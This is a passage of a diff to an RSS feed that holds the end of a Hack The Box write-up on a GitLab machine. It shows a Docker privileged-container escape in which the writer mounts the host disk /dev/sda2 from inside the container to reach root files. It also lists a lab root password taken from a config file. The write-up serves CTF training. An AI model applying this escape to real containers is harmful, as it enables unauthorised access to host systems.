+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In short, if a docker container is configured with the &lt;code&gt;--privilaged&lt;/code&gt; flag then this means that any protections afforded to the container, by Docker, are lost and a root user can easily access the host file system. Checking the current mount points:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@gitlab:/opt/backup# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+overlay          18G   12G  5.7G  68% /
+tmpfs            64M     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   64M   0% /dev
+tmpfs           2.0G     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  2.0G   0% /sys/fs/cgroup
+/dev/sda2        18G   12G  5.7G  68% /root_pass
+shm              64M  2.3M   62M   4% /dev/shm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This shows that &lt;code&gt;/dev/sda2&lt;/code&gt; maps to the &lt;code&gt;/root_pass&lt;/code&gt; file and, as per the docker compose file, this is used for (likely) initial configuration of the container. The important bit is that it shows the block device the file resides on, meaning that it can quite easily be mounted:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@gitlab:/opt/backup# mkdir /mnt/hdd
+root@gitlab:/opt/backup# mount /dev/sda2 /mnt/hdd
+root@gitlab:/opt/backup# ls -la /mnt/hdd/root/root.txt
+-r-------- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; Jul  &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; root.txt
+root@gitlab:/opt/backup#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And with that, access to the root filesystem (along with its associated SSH keys) is granted.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;credentials-store&#34;&gt;Credentials Store&lt;/h1&gt;
+&lt;p&gt;Here are a list of credentials obtained during this exercise:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;User&lt;/th&gt;
+&lt;th&gt;Password&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;root&lt;/td&gt;
+&lt;td&gt;wW59U!ZKMbG9+*#h&lt;/td&gt;
+&lt;td&gt;Root password - GitLab Docker container. Obtained via LinPEAS grabbing the &lt;code&gt;smtp_password&lt;/code&gt; value from the gitlab_rails config.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;final-thoughts&#34;&gt;Final Thoughts&lt;/h1&gt;
+&lt;p&gt;If you&amp;rsquo;re at least semi-experienced, this box will most likely have been a total cinch for you. I know I didn&amp;rsquo;t really need to do a whole lot of work from start to finish&amp;ndash; frankly, it&amp;rsquo;s one of the easiest boxes in recent memory.&lt;/p&gt;
+&lt;p&gt;All that said, there&amp;rsquo;s still a tonne of value in things like this. If you&amp;rsquo;re seasoned, you just got to ensure you&amp;rsquo;ve not just casually forgotten basic things. If you&amp;rsquo;re new to the field, this can easily provide a challenge, especially to those unfamiliar with Docker and its configurations. Let the lesson be: privilaged containers are bad. Until next time!&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-5ysk3y&lt;/code&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
       <title>OpenAdmin [Easy] - Linux</title>
       <link>https://5ysk3y.github.io/htb/guides/openadmin/</link>
       <pubDate>Sat, 02 May 2020 00:00:00 +0000</pubDate>
